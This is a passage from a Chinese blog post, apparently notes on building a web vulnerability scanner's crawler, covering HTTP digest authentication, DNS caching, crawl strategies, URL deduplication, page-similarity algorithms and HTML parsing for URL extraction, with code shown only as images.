id="1-第一次交互"><a href="#1-第一次交互" class="headerlink" title="1.第一次交互"></a><strong>1.第一次交互</strong></h5><p>客户端在向服务端发送请求后， 服务端会返回 401 UNAUTHORIZED, 同时在响应头中的 WWW-Authenticate 字段说明认证方式是 Digest, 其他信息还有 realm 域信息、 nonce 随机字符串、 opaque 透传字段（客户端会原样返回）等， 如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F3.png" alt="此处输入图片的描述"></p><h5 id="2-第二次交互"><a href="#2-第二次交互" class="headerlink" title="2.第二次交互"></a><strong>2.第二次交互</strong></h5><p>此时客户端会将用户名、密码、nonce、HTTP Method 和 URI 作为校验值进行 md5 散列计算，然后通过请求头再次发送给服务端， 服务端认证成功后就会返回如下的正常内容。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F4.png" alt="此处输入图片的描述"></p><p>其中客户端请求头 Authorization 字段中的 response 值为加密后的密码，服务端通过该值来完成认证， 它的生成方式分三步计算：</p><p>(1) 对用户名、认证域 (realm), 以及密码的合并值计算 md5 哈希值， 结果记为 HAI。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F5.png" alt="此处输入图片的描述"></p><p>(2) 对 HTTP 的请求方法， 以及URI的摘要的合并值计算 md5 哈希值， 结果记为 HA2。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F6.png" alt="此处输入图片的描述"></p><p>(3) 按照下面的方式生成 response 值， 如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F7.png" alt="此处输入图片的描述"></p><p>其实，基本式认证和摘要式认证都是比较脆弱的认证方式，它们都无法阻止监听和劫持攻击</p><h3 id="2-HEAD-方法"><a href="#2-HEAD-方法" class="headerlink" title="2.HEAD 方法"></a><strong>2.HEAD 方法</strong></h3><p>HTTP 协议中有很多请求方法， 这里主要说一下HEAD方法。HEAD方法与 GET 方法相同，<strong>只不过服务器响应时不会返回消息体， 只有消息头。</strong></p><blockquote><p><strong>注：</strong><br>这个特性在我门的扫描过程中大有用处，如果阅读过 sqlmap 源码的效果版就知道 sqlmap 中就是通过使用 HEAD头获取页面返回长度而不需要将整个页面返回的，<strong>这样就大大降低了整个扫描对比的时间成本，提高了扫描效率。</strong></p></blockquote><p>下面我们用curl命令发送一个HEAD请求， 举例如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F8.png" alt="此处输入图片的描述"></p><h3 id="3-Cookie-机制"><a href="#3-Cookie-机制" class="headerlink" title="3.Cookie 机制"></a><strong>3.Cookie 机制</strong></h3><p>网站设置的 Cookie，在写爬虫的时候一定要考虑到将其带上，如果有 session 请记得采用未出会话的方式</p><h3 id="4-DNS-本地缓存"><a href="#4-DNS-本地缓存" class="headerlink" title="4. DNS 本地缓存"></a><strong>4. DNS 本地缓存</strong></h3><p>浏览器在与 Web 服务器进行交互时，会向 DNS 服务器发送 DNS 查询，请求查找域名对应的 IP 地址。 在对一个域名进行爬取时， 如果每次都要对域名进行 DNS 查询解析， 就会浪费很多不必要的查询时间， 这时 DNS 缓存的作用就突显出来， <strong>它可以将域名与 IP 对应的关系存储下来</strong>。 当再次去访问这个域名时， 浏览器就会从 DNS 缓存中把 IP 信息取出来， 不再去进行 DNS 查询， 从而提高了页面的访问速度。</p><p><strong>DNS 本地缓存有两种形式：</strong></p><p>(1)一种是浏览器缓存<br>(2)另一种是系统缓存</p><p>在浏览器中访问域名时，它会优先访问浏览器缓存。 一但未命中，则会访问系统缓存。 既然是缓存， 那么就会涉及有效时间。 系统缓存的 DNS 记录有一个 TTL 值 (time to live), 单位是秒， 意思是这个缓存记一个 TTL 值 (time to live), 单位是秒， 意思是这个缓存记录的最大有效时间。 而浏览器缓存的有效时间， 则是由各自厂商单独设置的， 不同种类的浏览 器， 缓存时间不尽相同， 比如： chrome 浏览器的缓存时间大约为 1 分钟。</p><h4 id="1-浏览器缓存"><a href="#1-浏览器缓存" class="headerlink" title="(1)浏览器缓存"></a><strong>(1)浏览器缓存</strong></h4><p><strong>以 chrome 为例：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F9.png" alt="此处输入图片的描述"></p><h4 id="2-系统缓存"><a href="#2-系统缓存" class="headerlink" title="(2)系统缓存"></a><strong>(2)系统缓存</strong></h4><p>Windows 下在 cmd 中输入 ipconfig /displaydns 可以查看</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F10.png" alt="此处输入图片的描述"></p><p>Linux 下 使用 nscd -g</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F11.png" alt="此处输入图片的描述"></p><h3 id="5-页面解析"><a href="#5-页面解析" class="headerlink" title="5.页面解析"></a><strong>5.页面解析</strong></h3><p>这里说的页面解析，<strong>主要是指对 HTTP 请求后的响应内容进行页面分析，并从中提取 URL 的过程</strong>。我们知道， HTTP 响应分为响应头和响应体，响应头的内容比较固定，解析也相对简单；而响应体则不一样，它的内容类型多种多样，不同内容的解析方式也不同， 因此需要根据响应体的内容类型来区别对待。</p><p>响应体的内容类型则是由响应头中的” Content-Type” 字段来指定的，它主要用千定义网络文件的类型和网页的编码， 常见的内容类型如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F12.png" alt="此处输入图片的描述"></p><p>本文还是以 HTML 的解析为主</p><h3 id="6-爬虫策略"><a href="#6-爬虫策略" class="headerlink" title="6.爬虫策略"></a><strong>6.爬虫策略</strong></h3><p>爬虫在爬取的过程中会涉及到非常多的不同页面间的互相引用，如果没有一些机制的话就会出现爬取到的页面有很多的重复</p><h4 id="1-广度优先策略"><a href="#1-广度优先策略" class="headerlink" title="(1)广度优先策略"></a><strong>(1)广度优先策略</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F13.png" alt="此处输入图片的描述"></p><h4 id="2-深度优先策略"><a href="#2-深度优先策略" class="headerlink" title="(2)深度优先策略"></a><strong>(2)深度优先策略</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F13.png" alt="此处输入图片的描述"></p><h4 id="3-最佳优先策略-聚焦爬虫策略"><a href="#3-最佳优先策略-聚焦爬虫策略" class="headerlink" title="(3)最佳优先策略(聚焦爬虫策略)"></a><strong>(3)最佳优先策略(聚焦爬虫策略)</strong></h4><p>最佳优先策略，是一种<strong>启发式的爬行策略</strong>。它其实是广度优先策略的一种改进，在广度优先策略的基础上，用一定的网页分析算法，对将要遍历的页面进行评估和筛选，然后选择评估最优的一个或多个页面进行遍历，直至遍历所有的页面为止。</p><blockquote><p><strong>注意：</strong> 在很多情况下， 由于深度优先策略会导致爬虫的 ＂陷入”问题，即无法进行回退遍历，特别是对于大型的互联网网站，通常需要设置爬行的深度，否则爬虫在有限的时间内将无法爬完。 而且在实际的应用中，随着爬行深度的递增，有价值的URL也会相应减少。因此，深度优先策略并不太适用，目前爬虫通常选择的策略是广度优先策略和最佳优先策略。</p></blockquote><h3 id="7-页面跳转"><a href="#7-页面跳转" class="headerlink" title="7.页面跳转"></a><strong>7.页面跳转</strong></h3><p>很多情况下页面会进行跳转，这时候爬虫就要去 follow</p><h4 id="1-客户端跳转"><a href="#1-客户端跳转" class="headerlink" title="(1)客户端跳转"></a><strong>(1)客户端跳转</strong></h4><p>客户端跳转通常也分为两种： 一种是301跳转，<strong>301代表永久性转移</strong>(Permanently Moved)，另一种是302跳转， <strong>302代表临时性跳转</strong>(Temporarily Moved)。 其实301跳转流程与302跳转流程 一样， 只不过状态码不同而已。 </p><p>当客户端向服务端发送一个请求时，服务端会返回一个301或302的跳转响应，客户端浏览器在接收到这个响应后就会发生页面跳转， 它会根据这个响应头中”Location”字段所包含的地址，再次自动向服务端发送一个HTTP请求来完成跳转过程。</p><h4 id="2-服务端跳转"><a href="#2-服务端跳转" class="headerlink" title="(2)服务端跳转"></a><strong>(2)服务端跳转</strong></h4><p>服务端在收到客户端的HTTP请求后，<strong>由于请求的页面和实际处理请求的页面不同</strong>，因此服务端会在内部进行页面跳转，我们称为服务端跳转。在这个过程中，其实服务端只收到客户端的一个HTTP请求，它对客户端来说是透明的，<strong>因此客户端看到的仍然是原始的URL, 响应的状态码也为200。</strong>，这似乎就是我们常见的 PHP 下的 include 的某种操作。</p><p>我们可以在Nginx中增加下面内容：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F15.png" alt="此处输入图片的描述"></p><p>其中，abed.html是客户端发起的请求，而实际服务端处理和响应的是test.html这个页面， 如下图：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F16.png" alt="此处输入图片的描述"></p><blockquote><p><strong>注意：</strong> 服务瑞跳转时，客户端只发送一次请求，浏览器的地址栏不会显示目标地址的URL，而客户端跳转时，由于是两次请求，这时地址栏中会显示目标资源的URL。</p></blockquote><h3 id="8-识别-404-页面"><a href="#8-识别-404-页面" class="headerlink" title="8.识别 404 页面"></a><strong>8.识别 404 页面</strong></h3><p>在爬行的过程中，<strong>爬虫需要识别404错误页面</strong>，并根据它来标记当前所爬行的URL是否有效或存在，这样就可以<strong>避免无效爬取，提高爬虫效率</strong>。 通常管理员在<strong>设置404错误页面时有下面两种情况：</strong></p><p>1.直接在Web容器中设置404错误页面， 此时服务端返回 404状态码</p><p>2.将404错误页面指向一个新的页面， 在页面中使用301或302的方式重定向跳转到这个页面， 此时服务器返回301或302状态码。</p><p>所以从理论上而言， 404错误页面一般返回的状态码为：301、302或404; 但也不排除有的管理员设置特殊， 直接返回状态码为200的错误页面。所以，<strong>对于404错误页面的识别，不能简单根据状态码信息来判断。</strong> 具体的识别方法，后面章节会详细介绍。</p><h3 id="9-URL重复-URL相似-URL包含"><a href="#9-URL重复-URL相似-URL包含" class="headerlink" title="9.URL重复/URL相似/URL包含"></a><strong>9.URL重复/URL相似/URL包含</strong></h3><p>这三个概念主要用于爬虫对URL列表进行过滤，过滤掉一些对扫描器没有意义的URL,减少重复爬取的时间，提高扫描器整体的效率。 由于这些名词并不属于标准概念，因此笔者在下面先给出其定义。</p><h4 id="1-URL重复"><a href="#1-URL重复" class="headerlink" title="(1)URL重复"></a><strong>(1)URL重复</strong></h4><p>URL重复，是指<strong>两个URL完全一样</strong>。具体来说，就是协议、主机名、端口、路径、参数名和<strong>参数值</strong>都相同。</p><h4 id="2-URL相似"><a href="#2-URL相似" class="headerlink" title="(2)URL相似"></a><strong>(2)URL相似</strong></h4><p>URL相似，是指两个URL的协议、主机名、端口、路径、参数名和<strong>参数个数</strong>都相同。</p><h4 id="3-URL包含"><a href="#3-URL包含" class="headerlink" title="(3)URL包含"></a><strong>(3)URL包含</strong></h4><p>URL包含，是指两个URL, 将它们分别记为A和B, 它们的协议、主机名、端口和路径都相同。</p><p>若A的参数个数大千或等千B, 那么B的参数名列表与A的参数名列表存在包含关系，其实URL相似可以看作URL包含的一种特例，A和B的参数相同。</p><h3 id="10-区分相似和包含URL的意义"><a href="#10-区分相似和包含URL的意义" class="headerlink" title="10.区分相似和包含URL的意义"></a><strong>10.区分相似和包含URL的意义</strong></h3><p>这里我们结合扫描器的场景来看，扫描器获取这些URL的目的主要是对它们进行安全漏洞审计，而安全漏洞审计的主要方式是<strong>对URL中的参数进行模糊测试</strong>(Fuzz testing)。 </p><p>对于相似的URL检测，其实就是检查服务端上同一个文件的相同参数。 从漏洞检测的角度来看， 如果其中一个 URL 存在漏洞那么相似 URL 也存在漏洞</p><p>包含的URL也是同样的道理， 对千服务端上的同一文件只要检测不同的参数，对于相同的参数无需检查</p><h3 id="11-URL去重"><a href="#11-URL去重" class="headerlink" title="11.URL去重"></a><strong>11.URL去重</strong></h3><p>常见的方式有两种： 布隆过滤器和哈希表去重。</p><h4 id="1-布隆过滤器"><a href="#1-布隆过滤器" class="headerlink" title="(1)布隆过滤器"></a><strong>(1)布隆过滤器</strong></h4><p>布隆过滤器(Bloom-Filter), 是由布隆(Burton Howard Bloom)在1970年提出的。 它实际上是<strong>由一个很长的二进制向量和一系列随机映射函数组成的</strong>，可以用于<strong>检索一个元素是否在一个集合中</strong>。它的优点是空间和查询时间都远远超过一般的算法，缺点是有一定的误识别率和删除困难。 因此，BloomFilter 不适合那些 “零错误” 的应用场合。<strong>而在能容忍低错误率的应用场合下</strong>，BloomFilter 比其他常见的算法（如Hash、折半查找）极大地节省了空间。</p><p><strong>原理如下：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F17.png" alt="此处输入图片的描述"></p><h4 id="2-哈希表去重"><a href="#2-哈希表去重" class="headerlink" title="(2)哈希表去重"></a><strong>(2)哈希表去重</strong></h4><p>哈希表去重的做法比较简单，它通过建立一个哈希表，然后将种子URL放进去. 对于任何一个新的URL.首先它需要在哈希表中进行查找，如果哈希表中不存在，那么就将新的URL插入哈希表中，直至遍历完所有的URL, 最后哈希表中的内容就是去重后的URL。 <strong>这种方式去重效果精确，不会漏掉一个重复的URL, 但对空间的消耗也相应较大。</strong> 根据哈希表存放的位置，可以将其分为两种方式：<strong>一种是基于内存的Hash表去重</strong>；<strong>另一种是基于硬盘的Hash表去重</strong>。</p><h5 id="1-基于内存的Hash表去重"><a href="#1-基于内存的Hash表去重" class="headerlink" title="1.基于内存的Hash表去重"></a><strong>1.基于内存的Hash表去重</strong></h5><p>这种方式直接在内存中对URL进行操作和去重，<strong>随着URL的增长，它消耗的内存空间也越来越多</strong>，然而内存大小是有瓶颈的，因此，<strong>它无法完成对大型网站的全站爬取</strong>。 但由于数据操作是直接在内存中执行的，所以，<strong>它的处理速度很快</strong>。</p><p>在真实的爬取中，由于URL 是字符串形式，占用的字节数较多，按照保守估计，每个URL平均的长度为20 ,当然，URL越长占用的空间也就越大。这种情况下我们可以进行简单的优化，对URL进行压缩存储。</p><p>以md5哈希算法为例，md5运算后的结果是 128bit, 也就是16字节的长度，而且每个URL的长度都可以控制在16字节，这样就可以极人地减少存储空间的开销。</p><p>具体的操作方式为：<strong>对URL进行哈希运算，然后放到这个哈希表中</strong>，如果哈希值不存在千哈希表中， 就将该URL插入结果列表， 同时将哈希值插入哈希表， 直至遍历结束， 此时结果列表中就是去重后的URL。</p><h5 id="2-基于硬盘的Hash表去重"><a href="#2-基于硬盘的Hash表去重" class="headerlink" title="2.基于硬盘的Hash表去重"></a><strong>2.基于硬盘的Hash表去重</strong></h5><p>它将URL存储在硬盘上，并在硬盘上对其进行去重。这样在处理海量URL的时候，就不用担心内存溢出的问题。这种方式有个成熟的解决方案，就是利用Berkeley DB进行基于硬盘的URL去重。</p><p>Berkeley DB是一个开源的文件数据库， 介于关系数据库与内存数据库之间， 使用方式与内存数据库类似， <strong>它提供的是一系列直接访问数据库的函数， 是一个高性能的嵌入式数据库引擎，可以用来保存任意类型的键／值对(KeyNalue) , 而且可以为一个键值保存多个数据。</strong> </p><p>它支持数千个并发线程同时操作数据库，支待最大256TB的数据。 同时提供诸如C语言、C++、Java、Perl、Python等多种编程语言的API. 并且广泛支持大多数类Unix操作系统、Windows操作系统，以及实时操作系统（如：VxWorks)。</p><p>Berkeley DB实际是一个在硬盘上的 hash 表，我们可以使用压缩后的URL字符串作为Key,而对于Value可以使用Boolean,一个字节；实际上，Value是 个状态标识， 减少Value占用存储空间， 然后直接向Berkeley DB添加URL即可。 当遇到重复的URL时， 它就会通过返回值告知我们。</p><h3 id="12-页面相似算法"><a href="#12-页面相似算法" class="headerlink" title="12.页面相似算法"></a><strong>12.页面相似算法</strong></h3><p>在一些情况中，比如SQL注入检测，我们通常需要比较两个页面内容的关系，看看他们是否相似或相同，然后利用它们的差异性来判断输入对后端应用的影响。页面相这里主要介绍其中常用的两种： <strong>编辑距离和Simhash</strong></p><h4 id="1-编辑距离"><a href="#1-编辑距离" class="headerlink" title="1.编辑距离"></a><strong>1.编辑距离</strong></h4><p>它是指两个字符串之间，由一个转成另一个所需的最少编辑次数，许可的方式是：插入、删除、替换。编辑距离的算法由俄国科学家Levenshtein提出，所以叫LevenshteinDistance。 一般来说，编辑距离越小，两个串的相似度越大。</p><h4 id="2-Simhash"><a href="#2-Simhash" class="headerlink" title="2.Simhash"></a><strong>2.Simhash</strong></h4><p>Simhash是Google用来处理海量文本去重的算法，它会为每一个Web文档通过Hash的方式生成一个64位的字节指纹，暂目称之为 “特征字 “，判断相似度时<strong>，只需判断特征字的海明距离是不是小于n (根据经验值，n一般取值为3)</strong>‘ 就可判断两个文档是否相似。</p><p>那么，什么叫海明距离呢？在信息编码中， 两个合法代码对应位上编码不同的位数称为码距，又称海明距离。</p><p><strong>举例如下：</strong><br>10101 和 00110 从第一位开始依次有第一位， 第四位和第五位不同，则海明距离为3</p><blockquote><p>这里其实我还是有一个疑问，因为 hash 是杂凑函数，也就是页面只要改变一点点 hash就会变得完全不同，这就是所谓的雪崩效应，所以我不知道他是怎么做到小于 3 的</p></blockquote><h3 id="13-断连重试"><a href="#13-断连重试" class="headerlink" title="13.断连重试"></a><strong>13.断连重试</strong></h3><p>在爬虫的爬行过程中，为了保证爬虫的稳定和健壮，必须要考虑网络抖动的因素。因此，我们需要增加断连重试机制。当连接断开时，爬虫需要尝试去重新建立新的连接，只有当连接断开的次数超过阀值时，才会认定当前的网络不可用。</p><h3 id="14-动态链接与静态链接"><a href="#14-动态链接与静态链接" class="headerlink" title="14.动态链接与静态链接"></a><strong>14.动态链接与静态链接</strong></h3><p>这里所说的动态链接和静态链接，主要是针对URL而言的 它们可以通过URL的扩展名来区分。<strong>静态链接主要是指静态资源文件</strong>，扩展名主要为： rar、 zip、 ttf、 png、 gif等。 因为<strong>它们对获取新的URL并没有做出太多贡献</strong>，而且这类链接的数量又非常大， 因此，<strong>我们需要在新一轮爬取前过滤这些无意义的静态链接， 这样就可以极大地提高爬行效率</strong>。</p><p><strong>动态链接与静态链接是相反的</strong>，它所代表的页面中包含新的URL. <strong>我们需要对其进行页面解析和URL提取操作</strong>， 这类链接的扩展名主要为： html 、 shtml、 do、 asp、 aspx、 php、 jsp等</p><h2 id="0X03-web-爬虫进阶"><a href="#0X03-web-爬虫进阶" class="headerlink" title="0X03 web 爬虫进阶"></a><strong>0X03 web 爬虫进阶</strong></h2><h3 id="1-web-爬虫的工作原理"><a href="#1-web-爬虫的工作原理" class="headerlink" title="1.web 爬虫的工作原理"></a><strong>1.web 爬虫的工作原理</strong></h3><p>Web爬虫，即从一个或若干个<strong>初始网页的URL开始</strong>，获得初始网页上的URL, 在抓取网页的过程中<strong>，不断从当前页面上抽取新的URL放入队列</strong>，直到满足一定的条件才会停止爬取。</p><p>从上面这段话可以看到，<strong>爬虫的工作原理其实很简单</strong>，根据内容定义可以很容易地给出Web爬虫的框架代码(Python版本），如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F18.png" alt="此处输入图片的描述"><br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F20.png" alt="此处输入图片的描述"></p><h3 id="2-实现-URL-的封装"><a href="#2-实现-URL-的封装" class="headerlink" title="2.实现 URL 的封装"></a><strong>2.实现 URL 的封装</strong></h3><p>由于在爬取的过程中，爬虫不仅需要对URL进行频繁操作和处理，同<strong>时还需要获取URL 中的很多元信息</strong>，比如， 主机名、端口、根域名、文件名、扩展名和请求参数等。 因此，在这里我们<strong>需要对URL进行类封装</strong>， 这样可以方便后续对其进行统一的维护和改进。</p><p>在URL类中， 主要通过Python自带的URL解析模块(urlparse)来获取URL相关的属性信息， 部分实现代码如下：</p><p><strong>URL 类：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F22.png" alt="此处输入图片的描述"></p><p><strong>URL 类方法：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F23.png" alt="此处输入图片的描述"></p><p>然后我们就可调用这个类的方法去获取地址的各种部分了</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F24.png" alt="此处输入图片的描述"></p><h3 id="3-HTTP-的请求和响应"><a href="#3-HTTP-的请求和响应" class="headerlink" title="3.HTTP 的请求和响应"></a><strong>3.HTTP 的请求和响应</strong></h3><p>我们的爬虫最基本的功能就是去请求页面然后获取页面的响应，为了方便我们依然对其进行封装</p><h4 id="1-Request-类"><a href="#1-Request-类" class="headerlink" title="(1)Request 类"></a><strong>(1)Request 类</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F25.png" alt="此处输入图片的描述"></p><h4 id="2-Response-类"><a href="#2-Response-类" class="headerlink" title="(2)Response 类"></a><strong>(2)Response 类</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F26.png" alt="此处输入图片的描述"></p><h4 id="3-wCurl-类"><a href="#3-wCurl-类" class="headerlink" title="(3)wCurl 类"></a><strong>(3)wCurl 类</strong></h4><p>具体的请求和响应我们使用的是 wCurl 类来实现， wCurl 是一个基千 Requests 模块的二次封装， </p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F28.png" alt="此处输入图片的描述"></p><h4 id="4-查询-dns-缓存"><a href="#4-查询-dns-缓存" class="headerlink" title="(4)查询 dns 缓存"></a><strong>(4)查询 dns 缓存</strong></h4><p>在 URL 爬取过程中，为了减少频繁地对域名进行 DNS 查询，我们可以根据本地缓存 DNS的查询结果进行优化。如果该域名已经查询过，那么就直接返回DNS查询结果，而不必向DNS服务器发送查询请求。 只有当该域名还没有被查询过的时候， 才会进行DNS查询， 并记录域名到IP的对应关系。 具体的代码实现如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F29.png" alt="此处输入图片的描述"></p><h4 id="5-扫描速率控制"><a href="#5-扫描速率控制" class="headerlink" title="(5)扫描速率控制"></a><strong>(5)扫描速率控制</strong></h4><p><strong>扫描速率的控制有两种方法实现：</strong></p><p>1.是将需要发送的请求全部存入队列，然后新起一个线程，每隔一段时间从队列中取出一个请求进行发送，并对响应进行处理</p><p>2.使用 HOOK 的方式行处理，对socket中的connect函数进行HOOK,在<strong>请求发送之前进行时间间隔的统一控制</strong>和处理，从而实现扫描速率的控制。</p><p>由于HOOK的方式便于理解和操作，因此，这里就以HOOK方式来实现。在对connect函数进行HOOK之前，先举个例子， 便于读者理解。下面有个函数show() , 对其进行HOOK,在函数show()运行之前，打印出当前的时间，由于该例子用到Python 中的apply函数， 这里先介绍一下该函数的用法。</p><p>apply(func[,args [,kwargs]])函数用于当函数参数已经存在于一个元组或字典中时，间接地调用函数。args是个包含将要提供给函数的按位置传递的参数的元组。举例说明一下，假如函数A的位置为A(a= l,b=2) ,那么这个元组中就必须严格按照这个参数的位置顺序(a=3,b=4)进行传递，而不能是(b=4,a=3)这样的顺序。kwargs是个包含关键字参数的字典， 如果args不需要传递，kwargs需要传递，那么必须在args的位置留空，apply的返回值就是func函数的返回值。 如果直接省略了args, 那么任何参数都不会被传递。</p><p>下面我们来看看如何 利用apply函数进行HOOK操作， 代码实现如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F30.png" alt="此处输入图片的描述"><br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F31.png" alt="此处输入图片的描述"></p><p>具体实现如下</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F32.png" alt="此处输入图片的描述"></p><h3 id="4-页面解析"><a href="#4-页面解析" class="headerlink" title="4.页面解析"></a><strong>4.页面解析</strong></h3><h4 id="1-HTML-解析库"><a href="#1-HTML-解析库" class="headerlink" title="(1)HTML 解析库"></a><strong>(1)HTML 解析库</strong></h4><p>在 Python 环境中，常用的 HTML 解析库有 HTMLParser、 lxml 和 html5lib 等，可以使用它 们进行页面解析和 URL提取，其各自的特点如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F33.png" alt="此处输入图片的描述"></p><h5 id="1-HTMLParser"><a href="#1-HTMLParser" class="headerlink" title="1.HTMLParser"></a><strong>1.HTMLParser</strong></h5><p>它是Python中内置的用来<strong>解析HTML的模块</strong>，可以分析出HTML里面的标签、数据等,通过HTMLParser处理HTML非常简便。 HTMLParser采用的是一种事件驱动的模式， <strong>当HTMLParser找到一个特定的标记的时候就会调用用户自定义的函数</strong>，并以此来通知程序处理，其中<strong>用户定义的回调函数都是以handler_开头命名的</strong>。</p><h5 id="2-lxml"><a href="#2-lxml" class="headerlink" title="2.lxml"></a><strong>2.lxml</strong></h5><p>lxml 是Python处理XML和HTML相关功能最丰富和最容易使用的库。lxml是libxml2和libxslt 库的一个Python化的绑定。它与众不同的地方是兼顾了这些库的速度和功能的完整性，以及纯PythonAPI的简洁性。由于爬虫通常需要处理的页面很多， 所以这里我们选择速度快和容错能力强的lxml库对HTML进行解析。</p><h5 id="3-html5lib"><a href="#3-html5lib" class="headerlink" title="3.html5lib"></a><strong>3.html5lib</strong></h5><p>html5lib是一个通过Ruby和Python解析HTML文档的类库，支待HTML5并最大程度兼容桌面浏览器。在页面解析中，我们而要处理两个主要问题：一个是URL提取：另一个是自动填表。也就是说，当碰到页面中有FORM表单时， 需要完成对表单内容的自动填充，然后再发送给服务端。</p><h4 id="2-URL-提取"><a href="#2-URL-提取" class="headerlink" title="(2)URL 提取"></a><strong>(2)URL 提取</strong></h4><p>URL提取来源于HTTP响应头和HTTP响应体。</p><h5 id="1-HTTP响应头"><a href="#1-HTTP响应头" class="headerlink" title="1.HTTP响应头"></a><strong>1.HTTP响应头</strong></h5><p>当响应的状态码为301或302时，响应头中会有Location字段，它的值中会有URL信息，如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F34.png" alt="此处输入图片的描述"></p><p>当然可能还会有一些其他自定义字段包含URL 信息，所以需要从HTTP 响应头中提取URL</p><h5 id="2-HTTP响应体"><a href="#2-HTTP响应体" class="headerlink" title="2.HTTP响应体"></a><strong>2.HTTP响应体</strong></h5><p><strong>响应体中的URL 提取比较简单， 这里有两种常用的方式：</strong> </p><p>(1)利用<strong>URL正则对响应体的内容进行全文匹配</strong>，找出其中所有的URL信息；<br>(2)对HTML 进行解析，<strong>遍历存在URL的标签</strong>，如：超链接标签<code>&lt;a&gt;</code>、表单标签<code>&lt;form&gt;</code>和脚本标签<code>&lt;script&gt;</code>等，获取这些标签的属性值即可。</p><p><strong>利弊分析：</strong></p><p>(1)第一种方式由于是通过正则匹配来获取，URL 的准确度较差，只能够获取一些标准格式的URL:<br>(2)第二种方式是通过标签的属性值来获取URL, 理论上准确度会高些， 但可能会漏掉页面的一些URL。因此， 这里面结合两种方式来提取URL。</p><p>下面就利用lxml 的HTML解析器来对HTTP 响应进行解析并提取其中的URL 信息。HTML解析器在对HTML文档解析中会隐式触发一些函数， 比如，当解析器遇到HTML 标签调用时，如： <code>&lt;a href=&quot;http://www.baidu.com&quot;&gt;</code>, 就会调用函数<code>handle_a_tag_start(tag,attrs)</code>, 其中参数tag 是标签名，attrs 